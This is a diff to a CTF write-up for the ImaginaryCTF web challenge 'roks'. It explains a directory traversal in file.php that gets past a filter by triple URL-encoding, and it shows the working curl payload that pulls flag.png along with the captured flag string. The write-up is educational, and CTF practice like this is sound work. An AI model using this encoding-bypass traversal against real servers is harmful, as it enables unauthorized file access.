@@ -10,8 +10,9 @@ tags: ["ctf", "writeup", "Web"]
 # roks
 My rock enthusiast friend made a website to show off some of his pictures. Could you do something with it?
 
-
+```
 http://roks.chal.imaginaryctf.org/
+```
 
 ## Manual examination
 
@@ -36,6 +37,11 @@ After staring at the `file.php` its obvious that this is vulnerable to directory
 
 this actually vulnerable to triple encoding the payload like since the `urldecode` happens twice once for the check and once before the file is opened.
 
-`curl 'http://roks.chal.imaginaryctf.org/file.php?file=%25252E%25252E%25252F%25252E%25252E%25252F%25252E%25252E%25252F%25252E%25252E%25252Fflag%25252Epng' > curl.png`
+```
+curl 'http://roks.chal.imaginaryctf.org/file.php?file=%25252E%25252E%25252F%25252E%25252E%25252F%25252E%25252E%25252F%25252E%25252E%25252Fflag%25252Epng' > curl.png
+```
 
-we get an image with the flag `ictf{tr4nsv3rs1ng_0v3r_r0k5_6a3367}`
+we get an image with the flag 
+```
+ictf{tr4nsv3rs1ng_0v3r_r0k5_6a3367}
+```
